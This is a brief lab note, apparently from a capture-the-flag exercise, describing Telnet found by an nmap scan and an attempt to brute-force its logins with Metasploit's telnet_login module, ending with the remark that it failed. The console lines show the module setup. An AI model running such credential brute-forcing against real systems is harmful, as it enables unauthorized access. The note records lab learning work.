after the nmap scan we find that telnet service has been running  in the machine

telnet:

Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication channel between two machines.

in this lab we learn about telnet and brute force in telnet protocol using metasploit

~~~
msf auxiliary(telnet_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
msf auxiliary(telnet_login) > set RHOSTS 
RHOSTS => 10.129.204.160
msf auxiliary(telnet_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf auxiliary(telnet_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(telnet_login) > run
~~~
this exploit does not work
